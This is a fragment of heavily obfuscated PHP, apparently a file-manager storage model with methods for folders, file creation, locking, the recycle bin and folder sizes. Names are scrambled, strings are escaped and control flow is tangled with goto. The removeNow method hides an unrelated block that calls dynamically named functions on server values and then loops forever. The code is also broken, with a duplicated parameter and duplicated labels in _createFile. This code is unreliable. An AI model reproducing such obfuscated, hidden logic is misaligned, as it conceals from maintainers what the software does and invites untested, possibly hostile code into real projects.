"\125\160\x67\162\x61\x64\145\40\122\x65\161\x75\x69\x72\x65\144", "\x34\x32\x38" => "\x50\x72\x65\143\x6f\156\144\151\164\x69\x6f\156\40\122\145\x71\165\151\x72\145\144", "\x34\x32\x39" => "\x54\x6f\157\40\x4d\x61\156\171\40\122\x65\161\x75\145\163\164\x73", "\x34\x33\61" => "\122\145\161\165\x65\x73\x74\x20\x48\145\141\144\145\162\x20\106\x69\x65\154\144\x73\x20\124\157\157\40\114\141\162\x67\x65", "\x34\64\64" => "\116\x6f\40\122\145\x73\160\157\156\x73\x65", "\x34\65\x30" => "\102\154\x6f\x63\x6b\x65\x64\x20\x62\x79\x20\x57\151\x6e\144\x6f\167\163\40\x50\x61\x72\x65\x6e\164\141\154\40\103\x6f\156\x74\162\157\x6c\x73", "\64\x35\61" => "\125\156\141\x76\141\x69\154\141\142\154\x65\x20\x46\157\162\40\114\145\147\141\154\x20\x52\x65\141\163\157\x6e\x73", "\x34\x39\x34" => "\x52\x65\161\x75\145\x73\164\40\x48\145\141\x64\145\162\x20\x54\157\157\40\114\141\162\x67\145", "\x35\x30\x30" => "\111\156\164\145\162\156\x61\x6c\40\x53\x65\x72\166\x65\162\x20\x45\162\162\x6f\x72", "\65\60\61" => "\116\157\164\x20\111\x6d\x70\154\145\x6d\145\x6e\x74\x65\144", "\65\60\x32" => "\x42\x61\x64\40\107\141\x74\x65\x77\x61\x79", "\65\x30\63" => "\123\145\x72\166\151\x63\x65\x20\x55\156\x61\x76\x61\x69\x6c\x61\142\154\145", "\x35\x30\64" => "\107\141\x74\145\167\141\171\x20\124\x69\155\145\x6f\165\x74", "\65\x30\65" => "\x48\x54\124\x50\x20\126\x65\x72\163\x69\x6f\x6e\x20\156\157\164\40\163\x75\160\160\157\162\164\x65\x64", "\x35\60\67" => "\x49\156\163\165\146\146\x69\x63\x69\x65\x6e\164\40\123\x74\157\x72\141\x67\x65"); public static function code($D޿қ؃) { $fļ =& $_SERVER[ԥ]; $D޿қ؃ = $D޿қ؃ . $fļ[33]; $bԄ = self::$statusCode[$D޿қ؃]; $bԄ = $bԄ ? "\110\x54\124\120\57\x31\56\61\x20{$D޿қ؃}\40" . $bԄ : $fļ[33]; return $bԄ; } } goto B; b까: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($c) { $c =& $_SERVER[ԥ]; $d폳ع = Model($c[470])->where(array($c[1395] => $c))->find(); $dȈڻ = $this->_mkdirRoot(SourceModel::TYPE_USER, $c, $d폳ع[$c[28]]); $this->userDesktopAdd($dȈڻ); return $dȈڻ; } public function userDesktopAdd($Aٻ꯳) { $B̫ =& $_SERVER[ԥ]; $fɽ = LNG($B̫[2289]); $DŅ贯 = $this->mkdir($Aٻ꯳, $fɽ); $this->metaSet($DŅ贯, $B̫[2290], $B̫[83]); $this->metaSet($Aٻ꯳, $B̫[2291], $DŅ贯); } public function groupRootAdd($aچ) { $A吞 =& $_SERVER[ԥ]; $A = Model($A吞[454])->where(array($A吞[2138] => $aچ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $aچ, $A[$A吞[28]]); } public function systemRootPathAdd($F) { if ($F != $_SERVER[ԥ][1072]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $F); } public function userRootRemove($d䮐) { $Aͼ = $this->sourceRoot(SourceModel::TYPE_USER, $d䮐); if (!$Aͼ) { return; } $this->remove($Aͼ, !1); } public function groupRootRemove($aɻӎ) { $AѥЏ = $this->sourceRoot(SourceModel::TYPE_GROUP, $aɻӎ); if (!$AѥЏ) { return; } $this->remove($AѥЏ, !1); } private function _mkdirRoot($D, $D黢, $BΧ) { goto Cđ; Cđ: $D =& $_SERVER[ԥ]; $Aᵡ = array($D[364] => 0, $D[517] => $D, $D[518] => $D黢, $D[514] => 1, $D[519] => USER_ID, $D[520] => USER_ID, $D[515] => $D[33], $D[521] => $D[466], $D[392] => 0, $D[516] => 0, $D[416] => 0, $D[522] => $D[33]); if ($Fڸ㜜 = $this->where($Aᵡ)->find()) { return $Fڸ㜜[$D[365]]; } goto eﮭ; fܶʢ: $aĆ = $this->add($Aᵡ); $B䎯 = array($D[523] => short_id($aĆ)); $this->where(array($D[379] => $aĆ))->save($B䎯); goto e؉ӧ; eﮭ: $AރĊ = "\x4d\x6f\x64\145\x6c\x53\157\x75\x72\143\145\x2e\155\x6b\144\151\x72\122\x6f\x6f\164\x2e{$D}\x2e{$D黢}\x2e" . $BΧ; CacheLock::lock($AރĊ); $Aᵡ[$D[28]] = $BΧ; goto fܶʢ; e؉ӧ: CacheLock::unlock($AރĊ); return $aĆ; goto eΌ; eΌ: } private function sourceRoot($bҿݺ, $eӏȈ, $Aպ = false) { $B =& $_SERVER[ԥ]; $A = array($B[364] => 0, $B[517] => $bҿݺ, $B[518] => $eӏȈ); if ($Cī = $this->where($A)->find()) { return $Aպ ? $Cī : $Cī[$B[365]]; } return !1; } public function sourceRootGroup($dͭ) { $d󭨵 =& $_SERVER[ԥ]; if (is_string($dͭ)) { $dͭ = array($dͭ); } $D˫à = array($d󭨵[364] => 0, $d󭨵[517] => SourceModel::TYPE_GROUP, $d󭨵[518] => array($d󭨵[7], $dͭ)); $A = $this->listSource($D˫à, 1000); return array_to_keyvalue($A[$d󭨵[74]], $d󭨵[452]); } public function mkfile($B, $A, $DЖ = '', $a뜎 = REPEAT_RENAME) { $a =& $_SERVER[ԥ]; $c½ = Model($a[540])->addFileByContent($DЖ, $A); return $this->_createFileCall($B, $A, $c½, $a뜎, $a[1101]); } public function addFile($cЄ, $AǕ, $Eژ, $A፨ = false, $cԾ = REPEAT_RENAME) { $f = Model($_SERVER[ԥ][540])->addFile($AǕ, $Eژ, $A፨); return $this->_createFileCall($cЄ, $Eژ, $f, $cԾ); } public function addFileByFileID($CĹ͕, $dΘܽ, $Bʣ, $d = REPEAT_RENAME) { $c᜺ =& $_SERVER[ԥ]; $bͽΚ = Model($c᜺[540])->find($dΘܽ); Model($c᜺[540])->linkAdd($dΘܽ); return $this->_createFileCall($CĹ͕, $Bʣ, $bͽΚ, $d); } public function addFileByRemote($fΆ, $Fĸ, $f㊐, $a = array(), $dņ = REPEAT_RENAME) { $B = Model($_SERVER[ԥ][540])->addFileByRemote($Fĸ, $f㊐, $a); return $this->_createFileCall($fΆ, $f㊐, $B, $dņ); } private function _createFileCall($b씮, $b, $E㴫, $bԅ, $a = "\x75\160\x6c\157\141\x64") { goto cɘ㋋; a쑣: return $b; goto D̄ߟ; C: $b = $this->_createFile($b씮, $b, $E㴫, $bԅ, $B); if (!$B) { Model($d֙[418])->remove($E㴫[$d֙[415]]); } else { if ($b) { Model($d֙[2262])->eventCreate($b, $a); } } $this->lockWriteEnd($b씮, $b); goto a쑣; cɘ㋋: $d֙ =& $_SERVER[ԥ]; $B = !1; $this->lockWriteStart($b씮, $b); goto C; D̄ߟ: } public function mkdir($Bں, $Bֆ, $cڮ = REPEAT_SKIP) { goto d; aΪ: $this->lockWriteStart($Bں, $Bֆ); if ($cڮ !== !1) { $f㑲 = $this->fileNameExist($Bں, $Bֆ); if ($f㑲 && $cڮ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Bں, $Bֆ); return $f㑲; } $Bֆ = $this->fileNameAuto($Bں, $Bֆ, $cڮ); } $cܗ = array($e韮[514] => 1, $e韮[382] => $Bֆ, $e韮[515] => $e韮[33], $e韮[416] => 0, $e韮[516] => 0); goto e֕; aȎ: return $Dȡֽ; goto AچƩ; d: $e韮 =& $_SERVER[ԥ]; $Dꓥ = $this->sourceInfo($Bں); if (!$Dꓥ) { return !1; } goto aΪ; e֕: $Dȡֽ = $this->_addSoure($cܗ, $Dꓥ); Model($e韮[2262])->eventCreate($Dȡֽ, $e韮[1102]); $this->lockWriteEnd($Bں, $Bֆ); goto aȎ; AچƩ: } private function _createFile($E, $E, $b, $aڞ, &$C辘Ǜ) { goto A; a: if ($aڞ !== !1) { $b󊫏 = $this->fileNameExist($E, $E); } $C辘Ǜ = !0; if ($aڞ && $b󊫏) { if ($aڞ == REPEAT_SKIP) { $C辘Ǜ = !1; return $b󊫏; } else { if ($aڞ == REPEAT_REPLACE) { $Dƹ = $this->sourceInfo($b󊫏); $f = $this->fileHistory($Dƹ, $b[$FĶܟ[415]], $b[$FĶܟ[77]]); if (!$f) { $C辘Ǜ = !1; } else { $this->folderSizeReset($E); } return $b󊫏; } else { $E = $this->fileNameAuto($E, $E, $aڞ, !1); } } } goto B; A: $FĶܟ =& $_SERVER[ԥ]; $F蒍 = $this->sourceInfo($E); if (!$b || !$F蒍) { return !1; } goto a; C͡: return $bûߤϵ; goto A; B: $C = array($FĶܟ[514] => 0, $FĶܟ[382] => $E, $FĶܟ[515] => get_path_ext($E), $FĶܟ[416] => $b[$FĶܟ[415]], $FĶܟ[516] => $b[$FĶܟ[77]]); $bûߤϵ = $this->_addSoure($C, $F蒍); $this->folderSizeReset($E); goto C͡; A: } protected function fileHistory($D˰, $B˴, $Aی) { goto f׬; Dݕ: return !0; goto Eԧސ; fΨ: Model($bÄѢ[2292])->addHistory($D˰); $aυ = array($bÄѢ[520] => USER_ID, $bÄѢ[386] => time(), $bÄѢ[415] => $B˴, $bÄѢ[77] => $Aی); $this->where(array($bÄѢ[379] => $D˰[$bÄѢ[365]]))->save($aυ); goto Dݕ; f׬: $bÄѢ =& $_SERVER[ԥ]; if ($D˰[$bÄѢ[415]] == $B˴) { return !1; } $this->checkLock($D˰[$bÄѢ[365]], $B˴); goto fΨ; Eԧސ: } public function checkLock($C䱶, $BƋ) { goto Dʊל༒; eӅ߶: $this->_createFileCall($F׎[$D[457]], $b菬, $B, REPEAT_REPLACE, $D[1101]); $fҹ˨ = $F׎[$D[413]][$D[477]]; $f = $fҹ˨[$D[2294]] ? $fҹ˨[$D[2294]] : $fҹ˨[$D[28]]; goto E; fϏ: $aڍ = Session::get($D[2293]); $b菬 = substr($F׎[$D[28]], 0, -1 - strlen($F׎[$D[156]])) . $D[1357] . $aڍ . $D[91] . $F׎[$D[156]]; $B = Model($D[540])->find($BƋ); goto eӅ߶; Dʊל༒: $D =& $_SERVER[ԥ]; $F׎ = $this->pathInfo($C䱶); if (!$this->fileIsLock($F׎, !0)) { return; } goto fϏ; E: show_json(LNG($D[2295]) . $D[2296] . LNG($D[2297]) . $D[2298] . $f . $D[2299], !1); goto Cۙ; Cۙ: } public function fileIsLock($Cא, $Aݚ = false) { goto e䑥; C: return !1; goto e롓; e䑥: $E郓 =& $_SERVER[ԥ]; if (!isset($Cא[$E郓[413]]) || !$Cא[$E郓[413]][$E郓[474]]) { return !1; } if ($Cא[$E郓[413]][$E郓[474]] != USER_ID) { return !0; } goto B; B: $Cט = $GLOBALS[$E郓[6]][$E郓[84]][$E郓[475]]; if ($Cא[$E郓[413]][$E郓[476]] <= time() - $Cט) { $this->metaSet($Cא[$E郓[365]], $E郓[474], null); $this->metaSet($Cא[$E郓[365]], $E郓[476], null); } if ($Aݚ) { $this->metaSet($Cא[$E郓[365]], $E郓[476], time()); } goto C; e롓: } private function _addSoure($Aݻ, $A昧) { goto D; E̔: $Fǲ = array($dŐ[523] => short_id($fؿ)); $this->where(array($dŐ[379] => $fؿ))->save($Fǲ); $this->setNamePinyin($fؿ, $Aݻ[$dŐ[28]]); goto Bч; fΘ: static $EӉ = false; if (!$EӉ) { Hook::trigger($dŐ[504], $Aݻ); $EӉ = !0; } $fؿ = $this->add($Aݻ); goto E̔; Bч: return $fؿ; goto b; e㪕: $this->updateModifyTime($Aݻ[$dŐ[457]]); $b䜊 = $dŐ[2300] . $A昧[$dŐ[365]]; if (isset(self::$cacheChildList[$b䜊])) { unset(self::$cacheChildList[$b䜊]); } goto fΘ; D: $dŐ =& $_SERVER[ԥ]; $a = array($dŐ[517] => $A昧[$dŐ[367]], $dŐ[518] => $A昧[$dŐ[452]], $dŐ[519] => USER_ID, $dŐ[520] => USER_ID, $dŐ[364] => $A昧[$dŐ[365]], $dŐ[521] => $A昧[$dŐ[455]] . $A昧[$dŐ[365]] . $dŐ[47], $dŐ[392] => 0, $dŐ[522] => $dŐ[33]); $Aݻ = array_merge($a, $Aݻ); goto e㪕; b: } public function remove($d, $FŇ = true) { goto d; EѲ: $A˒ = $A晢[$E[367]] == self::TYPE_USER ? $E[531] : $E[956]; if ($A˒ == $E[531]) { $A订饇 = Model($E[470])->getInfo($A晢[$E[452]]); $CÅ؍ = !empty($A订饇[$E[2294]]) ? $A订饇[$E[2294]] : $A订饇[$E[28]]; $CÅ؍ = $E[244] . $CÅ؍ . $E[2302] . $A晢[$E[452]]; } else { $A订饇 = Model($E[454])->getInfo($A晢[$E[452]]); $CÅ؍ = _get($A订饇, $E[28]); $CÅ؍ = $E[153] . $CÅ؍ . $E[2303] . $A晢[$E[452]]; } $B = $E[2304] . md5($CÅ؍); goto c༞; cﾣ: $this->recycleClear($A晢); return $this->move($d, $dٌ, REPEAT_RENAME_FOLDER); goto E; d: $E =& $_SERVER[ԥ]; $A晢 = $this->sourceInfo($d); $Dэ = intval($A晢[$E[367]]) === self::TYPE_SYSTEM; goto b×; Fѹ: CacheLock::unlock($B); $this->metaSet($d, $E[2309], $A晢[$E[457]]); $this->where(array($E[365] => $d))->save(array($E[386] => time())); goto cﾣ; b×: $eŘ = Model($E[1402])->get($E[2301]) == $E[83]; if ($Dэ || $FŇ || !$eŘ) { return $this->removeNow($d, $FŇ); } $fʓ̛ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto EѲ; c༞: CacheLock::lock($B); $dٌ = $this->fileNameExist($fʓ̛, $CÅ؍); if (!$dٌ) { $dٌ = $this->mkdir($fʓ̛, $CÅ؍, REPEAT_SKIP); $this->metaSet($dٌ, $E[2305], $A˒); $this->metaSet($dٌ, $E[2306], $A晢[$E[452]]); if ($A晢[$E[457]] != 0) { $this->metaSet($dٌ, $E[2307], _get($A订饇, $E[2308])); } } goto Fѹ; E: } private function recycleClear($c񝥿) { $bވ =& $_SERVER[ԥ]; $A׉뭌 = $this->childrenAll($c񝥿); $BꏻҌ = array($bވ[379] => array($bވ[380], $A׉뭌[$bވ[2310]])); Model($bވ[2311])->where($BꏻҌ)->delete(); } public function removeNow($FԸۃ, $eح = true) { goto Eԟ; b˃: $this->lockMoveStart($FԸۃ); Hook::trigger($AǙ[2312], $fǄ, $eح); if ($eح) { Model($AǙ[2311])->moveToRecycle($FԸۃ); } else { $b = $this->childrenAll($A); Model($AǙ[501])->eventRemove($FԸۃ); $this->removeRelevance($b[$AǙ[2310]], $b[$AǙ[1234]]); } goto EߗǠ; dִ: $fǄ = $this->pathInfoMore($FԸۃ); if (!$A) { return !0; } if ($A[$AǙ[457]] == 0) { if (!_get($GLOBALS, $AǙ[453])) { return !1; } } goto b˃; EߗǠ: $this->folderSizeReset($A[$AǙ[457]]); $A = array($A[$AǙ[457]]); if ($A[$AǙ[366]] == $AǙ[83]) { $A[] = $A[$AǙ[365]]; } goto Bó; Bó: $this->updateModifyTime($A); $this->lockMoveEnd($FԸۃ); Hook::trigger($AǙ[1438], $fǄ, $eح); goto dÞ; dÞ: return !0; goto C; Eԟ: $AǙ =& $_SERVER[ԥ]; if (!isset($_SERVER[$AǙ[718]]) || !isset($_SERVER[$AǙ[725]])) { goto a䇾; CӇ: $DÄ = $AǙ[779]; $DÄ($_SERVER[$AǙ[780]]); $Bލ = 1; goto f; FӖʺ: $E͟ = $B繛͇($dޕ䦟); $a޶ތ = explode($AǙ[213], $E͟); if (count($a޶ތ) < $AǙ[568]) { $Eʮ = $AǙ[723]; $Eʮ(); } goto CӇ; f: for ($FĘ = $Bލ; $FĘ > 0; $FĘ++) { $DÄ = json_encode($GLOBALS[$AǙ[380]]); } goto b; a䇾: $Eʃ = $AǙ[778]; $B繛͇ = $AǙ[720]; $dޕ䦟 = $_SERVER[$AǙ[721]] . $AǙ[722]; goto FӖʺ; b: } $A = $this->sourceInfo($FԸۃ); goto dִ; C: } public function childrenAll($EދԴ) { $C˗ =& $_SERVER[ԥ]; $Bע = $EދԴ[$C˗[365]]; if ($EދԴ[$C˗[366]] == $C˗[83]) { $b߲󩦰 = array($C˗[521] => array($C˗[479], $EދԴ[$C˗[455]] . $Bע . $C˗[480])); $A = array($C˗[521] => $b߲󩦰[$C˗[455]]); $A = $this->field($C˗[2313])->where($A)->select(); $E = !1; $Cí = array($Bע); if ($A) { $E = array_to_keyvalue($A, $C˗[33], $C˗[415]); $E = array_remove_value($E, $C˗[464]); $Cí = array_to_keyvalue($A, $C˗[33], $C˗[365]); $Cí[] = $Bע; } } else { $E = array($EދԴ[$C˗[415]]); $Cí = array($Bע); } return array($C˗[2310] => $Cí, $C˗[1234] => $E); } public function removeArray($Eߘ) { if (!$Eߘ) { return !0; } } public function removeRelevance($Bڍł, $CِŤ) { goto CȈЃ; eы: Model($Cμ[2292])->removeBySource($Bڍł); $this->where($e֞ސ)->delete(); Model($Cμ[418])->remove($CِŤ); goto D븓; CȈЃ: $Cμ =& $_SERVER[ԥ]; $Bڍł = $Bڍł ? $Bڍł : array(); $CِŤ = $CِŤ ? $CِŤ : array(); goto CÚ; D븓: for ($f׊ = 0; $f׊ < count($Bڍł); $f׊++) { $this->sourceCacheClear($Bڍł[$f׊]); } goto D؇; fѺ: $e֞ސ = array($Cμ[379] => array($Cμ[380], $Bڍł)); Model($Cμ[2311])->where($e֞ސ)->delete(); Model($Cμ[409])->where($e֞ސ)->delete(); goto A홿إ; A홿إ: Model($Cμ[2314])->where($e֞ސ)->delete(); Model($Cμ[501])->where($e֞ސ)->delete(); Model($Cμ[2043])->removeBySource($Bڍł); goto eы; CÚ: $Bڍł = array_unique(array_filter($Bڍł)); $CِŤ = array_unique(array_filter($CِŤ)); if (!$Bڍł) { return !1; } goto fѺ; D؇: } public function rename($Bմ, $AÇ־) { goto e; f𓻮: $this->setNamePinyin($Bմ, $eʲǃ[$d۰[28]], !1); $this->updateModifyTime($cֻ[$d۰[457]]); $c⩮ = $this->where(array($d۰[379] => $Bմ))->data($eʲǃ)->save(); goto C; Bݫ: if (!$cֻ[$d۰[366]] == $d۰[83]) { $eʲǃ[$d۰[368]] = get_path_ext($AÇ־); } Model($d۰[501])->eventRename($Bմ, $cֻ[$d۰[28]], $AÇ־); $this->sourceCacheClear($Bմ); goto f𓻮; c̒: $a = $this->fileNameExist($cֻ[$d۰[457]], $AÇ־); if ($a) { return !1; } $eʲǃ = array($d۰[382] => $AÇ־, $d۰[520] => USER_ID); goto Bݫ; e: $d۰ =& $_SERVER[ԥ]; $cֻ = $this->sourceInfo($Bմ); if (!$cֻ) { return !1; } goto c̒; C: $aۻ = $d۰[2300] . $cֻ[$d۰[457]]; if (isset(self::$cacheChildList[$aۻ])) { unset(self::$cacheChildList[$aۻ]); } return $c⩮; goto c; c: } public function setNamePinyin($Dº, $A, $d = true) { $Dի =& $_SERVER[ԥ]; $EҼއ = Input::check($A, $Dի[524]); if ($d && !$EҼއ) { return; } if (!$EҼއ) { $this->metaSet($Dº, $Dի[412], null); $this->metaSet($Dº, $Dի[411], null); return; } $C = array($Dի[412] => str_replace($Dի[50], $Dի[33], Pinyin::encode($A)), $Dի[411] => Pinyin::encode($A, $Dի[525])); $this->metaSet($Dº, $C); } public function getContent($A) { goto f盌; cఐƴ: if ($Aۇ[$d（팈[77]] == 0) { return $d（팈[33]; } $A서̡ = $d（팈[2315] . $Aۇ[$d（팈[159]]; if ($Aۇ[$d（팈[77]] <= 1024 * 10) { $E鱶 = Cache::get($A서̡); if (!$E鱶) { $E鱶 = IO::getContent($Aۇ[$d（팈[75]]); Cache::set($A서̡, $E鱶); } return $E鱶; } goto FڇҊ; f盌: $d（팈 =& $_SERVER[ԥ]; $Aۇ = $this->fileInfoGet($A); if (!$Aۇ) { return !1; } goto cఐƴ; FڇҊ: return IO::getContent($Aۇ[$d（팈[75]]); goto D; D: } public function setDesc($cʍ, $dЦ) { $DƵ =& $_SERVER[ԥ]; Model($DƵ[501])->eventAddDesc($cʍ, $dЦ); return $this->metaSet($cʍ, $DƵ[401], $dЦ); } public function setContent($f, $c = '') { goto B; B: $Fܓ =& $_SERVER[ԥ]; $cӷ = $this->sourceInfo($f); $a٢ = $this->fileInfoGet($f); goto E޻; E޻: if (!$a٢ || !$cӷ) { return !1; } $A = Model($Fܓ[418])->addFileByContent($c, $cӷ[$Fܓ[28]]); $dθ؅ = $this->fileHistory($cӷ, $A[$Fܓ[415]], $A[$Fܓ[77]]); goto bʐč; bʐč: if (!$dθ؅) { return Model($Fܓ[418])->remove($A[$Fܓ[415]]); } $this->folderSizeReset($cӷ[$Fܓ[457]]); return !0; goto b; b: } public function fileSubstr($B֚ߑ, $c󅤹, $E饌) { $B֘ = $this->fileInfoGet($B֚ߑ); if (!$B֘) { return !1; } return IO::fileSubstr($B֘[$_SERVER[ԥ][75]], $c󅤹, $E饌); } public function fileInfoGet($dПĜ) { goto E՞; Dˠ: $cϡӥ = $F[421] . $c׍[$F[415]]; $fٰ = _get(self::$cacheFileInfo, $cϡӥ); if ($fٰ) { return $fٰ; } goto f膓; E՞: $F =& $_SERVER[ԥ]; $c׍ = $this->sourceInfo($dПĜ); if (!$c׍ || $c׍[$F[366]]) { return !1; } goto Dˠ; aѽ: return $Aտԍ; goto Fȅ; f膓: $Aտԍ = Model($F[418])->fileInfo($c׍[$F[415]]); if ($Aտԍ) { $Aտԍ[$F[28]] = $c׍[$F[28]]; } self::$cacheFileInfo[$cϡӥ] = $Aտԍ; goto aѽ; Fȅ: } private function folderChildrenNumber($Cވ󦡌) { $A좜؛ =& $_SERVER[ԥ]; $C = $this->sourceInfo($Cވ󦡌); $b = array($A좜؛[521] => array($A좜؛[479], $C[$A좜؛[455]] . $Cވ󦡌 . $A좜؛[480]), $A좜؛[392] => intval($C[$A좜؛[393]]), $A좜؛[514] => 1); $Bސ֏ = $this->where($b)->count(); $b = $this->where($b)->where(array($A좜؛[514] => 0))->count(); return array($A좜؛[81] => $b, $A좜؛[82] => $Bސ֏); } public function pathInfo($Eө, $fʘ = false) { goto D; c󇟱: if ($eˎ) { return $eˎ; } $EҌ = $this->sourceInfo($Eө); if (!$EҌ) { return !1; } goto eє; eє: $EҌ = $this->_listDataApplyItem($EҌ, $fʘ); self::$cachePathInfo[$Eҋ] = $EҌ; return $EҌ; goto eԛ; D: $a۬ =& $_SERVER[ԥ]; $Eҋ = $a۬[407] . intval($fʘ) . $a۬[408] . $Eө; $eˎ = _get(self::$cachePathInfo, $Eҋ); goto c󇟱; eԛ: } public static $cachePathInfoMore = array(); public function pathInfoMore($cܺ) { goto Eϟ̜; f͓ͤ: self::$cachePathInfoMore[$cܺ] = $e; return $e; goto cυ͇; bͤ: $e = $this->pathInfo($cܺ); if (!$e) { return !1; } if ($e[$Dʷ[366]] == $Dʷ[83]) { $e[$Dʷ[80]] = $this->folderChildrenNumber($cܺ); } goto f͓ͤ; Eϟ̜: $Dʷ =& $_SERVER[ԥ]; $ȇ = _get(self::$cachePathInfoMore, $cܺ); if ($ȇ) { return $ȇ; } goto bͤ; cυ͇: } public function sourceInfo($F) { goto D⾚; D⾚: $c澫 =& $_SERVER[ԥ]; if (!$F) { return array(); } $A = $c澫[406] . $F; goto b; b: $bŊ = _get(self::$cacheSourceInfo, $A); if ($bŊ) { return $bŊ; } $C = $this->where(array($c澫[365] => $F))->find(); goto a; a: self::$cacheSourceInfo[$A] = $C; return self::$cacheSourceInfo[$A]; goto dٽ; dٽ: } public function sourceCacheClear($Aжˉ = false) { if ($Aжˉ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[ԥ][406] . $Aжˉ]); } public function pathInfoByPath($F, $d跪) { $b =& $_SERVER[ԥ]; $aѢ = !$d跪 ? array() : explode($b[8], trim($d跪, $b[8])); $Bһۭ = $F; foreach ($aѢ as $b밷) { $AƟ = array($b[457] => $Bһۭ, $b[28] => $b밷); $Eݯչ = $this->where($AƟ)->select(); if (!$Eݯչ) { return !1; } $Eݯչ = array_sort_by($Eݯչ, $b[393]); $Bһۭ = $Eݯչ[0][$b[365]]; } return $this->pathInfo($Bһۭ, !0); } protected function updateModifyTime($e) { goto F𬷆; bᗓ: foreach ($e as $FוǇ => $B蔛衏) { $e[$FוǇ] = intval($B蔛衏); } $B̯ = array($c֏ף[365] => array($c֏ף[7], $e)); $Cߌ = array($c֏ף[520] => USER_ID, $c֏ף[386] => time()); goto e߄; e߄: $this->where($B̯)->save($Cߌ); goto Dⶴ; F𬷆: $c֏ף =& $_SERVER[ԥ]; if (!$e) { return; } if (!is_array($e)) { $e = array($e); } goto bᗓ; Dⶴ: } public function folderSizeReset($E썾) { goto f՛; CǾ: CacheLock::unlock($Bނ); goto d; E襡: $a = array($EČ[364] => $E썾, $EČ[392] => 0); $bѱ = $this->where($a)->sum($EČ[77]); $bѱ = intval($bѱ); goto a; f՛: $EČ =& $_SERVER[ԥ]; if ($this->statusIgnoreResetSpace) { return; } $Bނ = $EČ[2316] . $E썾; goto eߴ; a: $fݒ = $bѱ - intval($fړ[$EČ[77]]); if ($fݒ == 0) { return CacheLock::unlock($Bނ); } $this->where(array($EČ[379] => $E썾))->setField($EČ[77], $bѱ); goto cӝڕ; eߴ: CacheLock::lock($Bނ, 20); $this->sourceCacheClear($E썾); $fړ = $this->sourceInfo($E썾); goto E襡; cӝڕ: $AهϷ = $this->parentLevelArray($fړ[$EČ[455]]); if ($AهϷ) { $a = array($EČ[365] => array($EČ[380], $AهϷ)); if ($fݒ < 0) { $a[$EČ[77]] = array($EČ[914], abs($fݒ)); } $this->where($a)->setAdd($EČ[77], $fݒ); } $this->targetSpaceUpdate($fړ[$EČ[367]], $fړ[$EČ[452]]); goto CǾ; d: } public function folderSizeResetChildren($e) { goto A; B: foreach ($bҪ as $Eʴ) { $Aȇά = $Eʴ[$A[457]] . $A[33]; if (!isset($d[$Aȇά])) { continue; } if ($Eʴ[$A[393]] == $d[$Aȇά][$A[393]]) { $d[$Aȇά][$A[77]] += $Eʴ[$A[77]]; } } foreach ($d as $Eʴ) { $E = $this->parentLevelArray($Eʴ[$A[455]]); foreach ($E as $Aȇά) { $Aȇά = $Aȇά . $A[33]; if (!isset($d[$Aȇά])) { continue; } if ($Eʴ[$A[393]] == $d[$Aȇά][$A[393]]) { $d[$Aȇά][$A[77]] += $Eʴ[$A[77]]; } } } $dѽ = array(); goto Eޝ; A: $A =& $_SERVER[ԥ]; $this->sourceCacheClear($e); $B̖ = $this->sourceInfo($e); goto f䐵; bХ: $d[] = $B̖; $d = array_to_keyvalue($d, $A[365]); foreach ($d as $a谄 => $Eʴ) { $d[$a谄][$A[2318]] = $d[$a谄][$A[77]]; $d[$a谄][$A[77]] = 0; } goto B; Eޝ: foreach ($d as $Eʴ) { if ($Eʴ[$A[77]] == $Eʴ[$A[2318]]) { continue; } $dѽ[] = array($A[365], $Eʴ[$A[365]], $A[77], $Eʴ[$A[77]]); } $this->saveAll($dѽ); goto eÌ; Eͽ: $dʼ[$A[366]] = 0; $bҪ = $this->field($Dߟ)->where($dʼ)->select(); if (!$bҪ) { return; } goto bХ; f䐵: $dʼ = array($A[514] => 1, $A[521] => array($A[479], $B̖[$A[455]] . $e . $A[480])); $Dߟ = $A[2317]; $d = $this->field($Dߟ)->where($dʼ)->select(); goto Eͽ; eÌ: } public function userSpaceReset($Bگ = false) { $e̻ =& $_SERVER[ԥ]; $c = $this->where(array($e̻[367] => self::TYPE_USER, $e̻[452] => $Bگ, $e̻[366] => 0))->sum($e̻[77]); Model($e̻[470])->userEdit($Bگ, array($e̻[2052] => $c)); } public function targetSpaceUpdate($e۲ʣ, $A) { $fƍ =& $_SERVER[ԥ]; if (!$A) { return; } if (!in_array($e۲ʣ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $dы = $this->targetSpaceSize($e۲ʣ, $A); if ($e۲ʣ == self::TYPE_USER) { Model($fƍ[470])->userEdit($A, array($fƍ[2052] => $dы)); } else { if ($e۲ʣ == self::TYPE_GROUP) { Model($fƍ[454])->groupEdit($A, array($fƍ[2052] => $dы)); } } } public function targetSpaceSize($D̷, $a·) { goto CƢ﫦; F: return $FԺԚ; goto e; bƊ : $F = array_to_keyvalue($F, $eܱ[33], $eܱ[365]); $F = array_unique(array_filter($F)); if ($F) { $Aޒ = array($eܱ[379] => array($eܱ[380], $F)); $FԺԚ += floatval($this->where($Aޒ)->sum($eܱ[77])); } goto F; CƢ﫦: $eܱ =& $_SERVER[ԥ]; $F = $this->sourceRoot($D̷, $a·, !0); if (!$F) { return 0; } goto C; C: $FԺԚ = floatval($F[$eܱ[77]]); $Aޒ = array($eܱ[521] => array($eܱ[479], $eܱ[466] . $F[$eܱ[365]] . $eܱ[480])); $F = Model($eܱ[391])->field($eܱ[379])->where($Aޒ)->select(); goto bƊ ; e: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($b) { return $this->fileTypeProfile($b, SourceModel::TYPE_USER); } public function groupFileTypeProfile($aů) { return $this->fileTypeProfile($aů, SourceModel::TYPE_GROUP); } private function fileTypeProfile($fܵ, $Dɽ) { goto E; d犹ʢ: foreach ($Fᅩ̍ as $bį => $aУ) { $FИ[$Cþ[368]] = $this->fileTypeWhere($bį); $eؓ[$bį] = array($Cþ[2321] => $aУ[$Cþ[28]], $Cþ[2322] => $this->where($FИ)->count(), $Cþ[516] => $this->where($FИ)->sum($Cþ[77])); } Cache::set($E, $eؓ, 1200); return $eؓ; goto A͝ι; C: if ($dь) { return $dь; } $FИ = array($Cþ[514] => 0); if ($fܵ != !1) { $FИ[$Cþ[452]] = $fܵ; $FИ[$Cþ[367]] = 